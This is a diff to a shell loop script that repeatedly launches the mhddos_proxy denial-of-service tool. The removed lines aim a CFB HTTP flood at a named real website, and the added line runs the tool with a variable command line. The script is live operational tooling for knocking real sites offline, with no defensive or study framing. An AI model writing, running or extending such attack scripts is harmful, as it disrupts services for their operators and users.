@@ -76,8 +76,8 @@ do
             echo "command line"
             echo $cmd_line
             echo "full cmd"
-            echo $(python3 -c "~/mhddos_proxy/runner.py -p 3600 https://www.vezetvsem.ru/ --http-methods CFB --debug")
-            python3 -c "~/mhddos_proxy/runner.py -p 3000 https://www.vezetvsem.ru/ --http-methods CFB --debug"
+
+            python3 ~/mhddos_proxy/$cmd_line
    done
 echo -e "#####################################\n"
 sleep $restart_interval
